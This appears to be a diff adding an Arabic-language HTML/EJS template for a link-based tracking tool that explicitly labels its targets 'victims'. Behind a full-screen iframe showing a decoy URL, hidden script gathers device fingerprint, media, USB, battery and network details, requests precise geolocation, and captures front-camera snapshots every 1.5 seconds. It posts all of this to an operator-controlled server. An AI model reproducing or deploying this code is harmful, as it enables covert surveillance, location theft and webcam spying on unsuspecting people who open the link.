@@ -1,0 +1,425 @@
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>نظام التتبع</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      color: #333;
+    }
+    
+    iframe {
+      border: 0;
+      overflow: hidden;
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1000;
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    
+    .section {
+      margin-bottom: 25px;
+      padding: 15px;
+      border-radius: 8px;
+      background: #f8f9fa;
+      border-left: 4px solid #3498db;
+    }
+    
+    .section-title {
+      color: #2c3e50;
+      margin-top: 0;
+      border-bottom: 1px solid #eee;
+      padding-bottom: 10px;
+    }
+    
+    .data-item {
+      margin: 8px 0;
+      line-height: 1.6;
+    }
+    
+    .label {
+      font-weight: bold;
+      color: #2980b9;
+    }
+    
+    .value {
+      color: #16a085;
+    }
+    
+    .error {
+      color: #e74c3c;
+      background: #fdecea;
+      padding: 8px;
+      border-radius: 4px;
+      margin: 5px 0;
+    }
+    
+    .success {
+      color: #27ae60;
+      background: #eafaf1;
+      padding: 8px;
+      border-radius: 4px;
+      margin: 5px 0;
+    }
+    
+    .header {
+      text-align: center;
+      background: #2c3e50;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" style="display:none" playsinline autoplay></video>
+  <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+  
+  <div class="container">
+    <div class="header">
+      <h1>نظام جمع معلومات الجهاز</h1>
+      <p>جمع البيانات في الخلفية...</p>
+    </div>
+    
+    <div id="data-container">
+      <!-- Data will be populated here -->
+    </div>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+  <script type="text/javascript" defer>
+    var uid = "<%=uid %>";
+    
+    // Arabic translations
+    const translations = {
+      sections: {
+        victimInfo: "✅ معلومات الضحية",
+        deviceInfo: "📱 معلومات الجهاز",
+        mediaDevices: "📷 معلومات أجهزة الوسائط",
+        networkInfo: "🕸️ معلومات الشبكة",
+        usbDevices: "🔌 أجهزة USB",
+        batteryInfo: "🔋 معلومات البطارية",
+        locationInfo: "📍 معلومات الموقع",
+        cameraInfo: "📷 صور الكاميرا"
+      },
+      labels: {
+        ip: "عنوان IP",
+        time: "الوقت",
+        deviceTime: "الوقت في جهاز الضحية",
+        productSub: "إصدار المتصفح",
+        vendor: "الشركة المصنعة",
+        maxTouchPoints: "نقاط اللمس",
+        doNotTrack: "عدم التتبع",
+        hardwareConcurrency: "أنوية المعالج",
+        cookieEnabled: "تفعيل الكوكيز",
+        appCodeName: "اسم التطبيق",
+        appName: "اسم المتصفح",
+        appVersion: "إصدار المتصفح",
+        platform: "النظام",
+        product: "المنتج",
+        userAgent: "وكيل المستخدم",
+        language: "اللغة",
+        languages: "اللغات",
+        webdriver: "مشغل الويب",
+        pdfViewerEnabled: "تفعيل PDF",
+        deviceMemory: "ذاكرة الجهاز",
+        type: "نوع الاتصال",
+        rtt: "زمن الوصول",
+        saveData: "توفير البيانات",
+        effectiveType: "نوع الاتصال الفعلي",
+        downlink: "سرعة التنزيل",
+        downlinkMax: "أقصى سرعة تنزيل",
+        batteryLevel: "مستوى البطارية",
+        chargingStatus: "حالة الشحن",
+        usbCount: "عدد أجهزة USB",
+        productName: "اسم المنتج",
+        serialNumber: "الرقم التسلسلي",
+        locationError: "خطأ في الموقع",
+        mediaError: "خطأ في أجهزة الوسائط",
+        cameraError: "خطأ في الكاميرا"
+      },
+      messages: {
+        collecting: "جمع البيانات...",
+        locationUnavailable: "واجهة الموقع غير متوفرة",
+        mediaError: "خطأ في أجهزة الوسائط: ",
+        locationError: "خطأ في الموقع: ",
+        cameraError: "خطأ في الوصول للكاميرا: ",
+        charging: "قيد الشحن",
+        notCharging: "غير قيد الشحن"
+      }
+    };
+
+    async function gather() {
+      let html = '';
+      
+      // Victim Information
+      <% if(!t) { %>
+        html += `
+          <div class="section">
+            <h2 class="section-title">${translations.sections.victimInfo}</h2>
+            <div class="data-item">
+              <span class="label">${translations.labels.ip}: </span>
+              <a class="value" href="https://ip-api.com/#<%=ip %>"><%=ip %></a>
+            </div>
+            <div class="data-item">
+              <span class="label">${translations.labels.time}: </span>
+              <span class="value"><%=time %></span>
+            </div>
+          </div>
+        `;
+      <% } else { %>
+        const ipData = await fetch("<%=a %>").then(r => r.json());
+        html += `
+          <div class="section">
+            <h2 class="section-title">${translations.sections.victimInfo}</h2>
+            <div class="data-item">
+              <span class="label">${translations.labels.ip}: </span>
+              <a class="value" href="https://ip-api.com/#${ipData.ip}">${ipData.ip}</a>
+            </div>
+            <div class="data-item">
+              <span class="label">${translations.labels.time}: </span>
+              <span class="value"><%=time %></span>
+            </div>
+          </div>
+        `;
+      <% } %>
+      
+      // Device time
+      html += `
+        <div class="section">
+          <div class="data-item">
+            <span class="label">${translations.labels.deviceTime}: </span>
+            <span class="value">${new Date()}</span>
+          </div>
+        </div>
+      `;
+      
+      // Device Information
+      const deviceProps = [
+        "productSub", "vendor", "maxTouchPoints", "doNotTrack", 
+        "hardwareConcurrency", "cookieEnabled", "appCodeName", 
+        "appName", "appVersion", "platform", "product", "userAgent", 
+        "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"
+      ];
+      
+      html += `<div class="section"><h2 class="section-title">${translations.sections.deviceInfo}</h2>`;
+      deviceProps.forEach(prop => {
+        if (prop in navigator) {
+          const value = navigator[prop];
+          html += `
+            <div class="data-item">
+              <span class="label">${translations.labels[prop] || prop}: </span>
+              <span class="value">${value}</span>
+            </div>
+          `;
+        }
+      });
+      html += `</div>`;
+      
+      // Media Devices
+      if (navigator.mediaDevices?.enumerateDevices) {
+        try {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          html += `<div class="section"><h2 class="section-title">${translations.sections.mediaDevices}</h2>`;
+          devices.forEach(device => {
+            html += `
+              <div class="data-item">
+                <span class="label">${device.kind}: </span>
+                <span class="value">${device.label || 'جهاز غير معروف'} (ID: ${device.deviceId})</span>
+              </div>
+            `;
+          });
+          html += `</div>`;
+        } catch (err) {
+          html += `
+            <div class="section">
+              <h2 class="section-title">${translations.sections.mediaDevices}</h2>
+              <div class="error">${translations.messages.mediaError} ${err.name}: ${err.message}</div>
+            </div>
+          `;
+        }
+      }
+      
+      // Network Information
+      if ("connection" in navigator) {
+        const netProps = [
+          "type", "rtt", "saveData", "effectiveType", "downlink", "downlinkMax"
+        ];
+        
+        html += `<div class="section"><h2 class="section-title">${translations.sections.networkInfo}</h2>`;
+        netProps.forEach(prop => {
+          const value = navigator.connection[prop];
+          html += `
+            <div class="data-item">
+              <span class="label">${translations.labels[prop] || prop}: </span>
+              <span class="value">${value}</span>
+            </div>
+          `;
+        });
+        html += `</div>`;
+      }
+      
+      // USB Devices
+      if ("usb" in navigator) {
+        try {
+          const devices = await navigator.usb.getDevices();
+          html += `
+            <div class="section">
+              <h2 class="section-title">${translations.sections.usbDevices}</h2>
+              <div class="data-item">
+                <span class="label">${translations.labels.usbCount}: </span>
+                <span class="value">${devices.length}</span>
+              </div>
+          `;
+          
+          devices.forEach(device => {
+            html += `
+              <div class="data-item">
+                <span class="label">${translations.labels.productName}: </span>
+                <span class="value">${device.productName || 'غير معروف'}</span>
+              </div>
+              <div class="data-item">
+                <span class="label">${translations.labels.serialNumber}: </span>
+                <span class="value">${device.serialNumber || 'غير متوفر'}</span>
+              </div>
+            `;
+          });
+          html += `</div>`;
+        } catch (err) {
+          console.error("USB Error:", err);
+        }
+      }
+      
+      // Battery Information
+      if ("getBattery" in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          html += `
+            <div class="section">
+              <h2 class="section-title">${translations.sections.batteryInfo}</h2>
+              <div class="data-item">
+                <span class="label">${translations.labels.batteryLevel}: </span>
+                <span class="value">${(battery.level * 100).toFixed(0)}%</span>
+              </div>
+              <div class="data-item">
+                <span class="label">${translations.labels.chargingStatus}: </span>
+                <span class="value">${battery.charging ? translations.messages.charging : translations.messages.notCharging}</span>
+              </div>
+            </div>
+          `;
+        } catch (err) {
+          console.error("Battery Error:", err);
+        }
+      }
+      
+      // Location Handling
+      const locationHandler = {
+        success: pos => {
+          const crd = pos.coords;
+          $.post("<%=a %>/location", {
+            uid: uid,
+            lat: encodeURIComponent(crd.latitude),
+            lon: encodeURIComponent(crd.longitude),
+            acc: encodeURIComponent(crd.accuracy)
+          });
+        },
+        error: err => {
+          html += `
+            <div class="section">
+              <h2 class="section-title">${translations.sections.locationInfo}</h2>
+              <div class="error">${translations.messages.locationError} ${err.message}</div>
+            </div>
+          `;
+          $("#data-container").html(html);
+        }
+      };
+      
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          locationHandler.success,
+          locationHandler.error,
+          { enableHighAccuracy: true, maximumAge: 0 }
+        );
+      } else {
+        html += `
+          <div class="section">
+            <h2 class="section-title">${translations.sections.locationInfo}</h2>
+            <div class="error">${translations.messages.locationUnavailable}</div>
+          </div>
+        `;
+      }
+      
+      // Camera Handling
+      const cameraHandler = {
+        init: async () => {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+              audio: false, 
+              video: { facingMode: "user" }
+            });
+            cameraHandler.success(stream);
+          } catch (e) {
+            html += `
+              <div class="section">
+                <h2 class="section-title">${translations.sections.cameraInfo}</h2>
+                <div class="error">${translations.messages.cameraError} ${e.toString()}</div>
+              </div>
+            `;
+            $("#data-container").html(html);
+          }
+        },
+        success: stream => {
+          const video = document.getElementById('video');
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
+          video.srcObject = stream;
+          
+          const captureInterval = setInterval(() => {
+            context.drawImage(video, 0, 0, 500, 500);
+            const imageData = canvas.toDataURL("image/png").split(",")[1];
+            $.post("<%=a %>/camsnap", {
+              uid: uid,
+              img: encodeURIComponent(imageData)
+            });
+          }, 1500);
+        }
+      };
+      
+      cameraHandler.init();
+      
+      // Update UI with collected data
+      $("#data-container").html(html);
+      
+      // Send data to server
+      $.post("<%=a %>/", {
+        data: encodeURIComponent(html),
+        uid: encodeURIComponent(uid)
+      });
+    }
+
+    // Start gathering data
+    $(document).ready(gather);
+  </script>
+  
+  <iframe src="<%=url %>"></iframe>
+</body>
+</html>
